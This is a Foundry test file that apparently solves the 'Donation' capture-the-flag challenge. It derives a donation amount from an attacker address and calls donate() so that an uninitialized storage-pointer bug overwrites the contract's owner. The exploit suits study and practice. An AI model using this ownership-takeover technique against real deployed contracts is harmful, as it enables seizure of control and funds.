// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/DonationChallenge.sol";

contract DonationChallengeTest is Test {
    DonationChallenge public donationChallenge;
    address alice = makeAddr("alice");

    function setUp() public {
        donationChallenge = new DonationChallenge{value: 1 ether}();
    }

    // this bug is fixed in solidity 0.6
    // error[3464]: TypeError: This variable is of storage pointer type and can be accessed 
    // without prior assignment, which would lead to undefined behaviour.
    function testDonation() public {
        emit log_named_address("owner", donationChallenge.owner());


        uint256 amount = uint256(uint160(alice));
        uint256 temp =  10**18 * 1 ether;
        uint256 value = amount/temp;

        payable(alice).transfer(value);


        vm.startPrank(alice);


        emit log_named_uint("value", value/temp);

        donationChallenge.donate{value: value}(amount);
        
        emit log_named_address("owner", donationChallenge.owner());
    }

}